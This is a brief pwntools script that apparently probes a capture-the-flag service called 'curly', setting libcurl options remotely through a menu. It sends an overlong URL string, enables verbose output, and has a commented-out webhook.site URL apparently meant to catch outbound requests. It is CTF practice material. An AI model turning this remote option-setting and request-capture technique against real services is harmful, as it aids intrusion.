#!/usr/bin/env python

from curl_opts import *
from pwn import *

HOST = "7e4fc76ef3ace35cda6f11fe-1024-curly.challenge.master.camp.allesctf.net" 
PORT = 31337

r = remote(HOST, PORT, ssl=True)

ru = lambda a: r.recvuntil(f'{a}'.encode('utf-8'))

def set_string(option, payload):
    r.sendline(b'1')
    r.sendline(f'{option}'.encode('utf-8'))
    r.sendline(f'{payload}'.encode('utf-8'))

def set_long(option, payload):
    r.sendline(b'0')
    r.sendline(f'{option}'.encode('utf-8'))
    r.sendline(f'{payload}'.encode('utf-8'))

def send_req():
    r.sendline(b'2')

def main():
    #set_string(CURLOPT_URL, "https://webhook.site/d969de04-d53a-4bfc-91df-a89def0b1785")
    set_string(CURLOPT_URL, "A"*0x64)
    set_long(CURLOPT_VERBOSE, 1)

    r.interactive()


if __name__ == "__main__":
    main()

"""
#define CURLOPTTYPE_LONG          0
#define CURLOPTTYPE_OBJECTPOINT   10000
#define CURLOPTTYPE_FUNCTIONPOINT 20000
#define CURLOPTTYPE_OFF_T         30000
#define CURLOPTTYPE_BLOB          40000

/* *STRINGPOINT is an alias for OBJECTPOINT to allow tools to extract the
   string options from the header file */


#define CURLOPT(na,t,nu) na = t + nu
#define CURLOPTDEPRECATED(na,t,nu,v,m) na CURL_DEPRECATED(v,m) = t + nu
"""
